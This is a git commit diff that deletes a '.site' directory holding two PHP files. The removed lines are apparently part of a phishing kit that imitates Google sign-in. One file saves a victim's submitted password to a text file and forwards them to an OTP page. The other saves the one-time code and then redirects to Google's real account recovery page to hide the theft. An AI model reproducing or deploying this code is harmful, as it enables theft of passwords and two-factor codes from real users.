faed19726a8bed25e49d4b221f5a8aca83e9c3a9
eliothandersonn <geladoxd4@gmail.com>
2025-09-13 12:42:17 -0300

    Delete .site directory

--- .site/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-file_put_contents("usernames.txt", "OTP: " . $_POST['OTP'] . "\n", FILE_APPEND);
-$url = "https://accounts.google.com/signin/v2/recoveryidentifier"; # https://accounts.google.com
-header("Location: $url");
-exit();
-?>
--- .site/pass.login.php
+++
@@ -1,5 +0,0 @@
-<?php
-file_put_contents("usernames.txt", "Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: otp.login.php');
-exit();
-?>
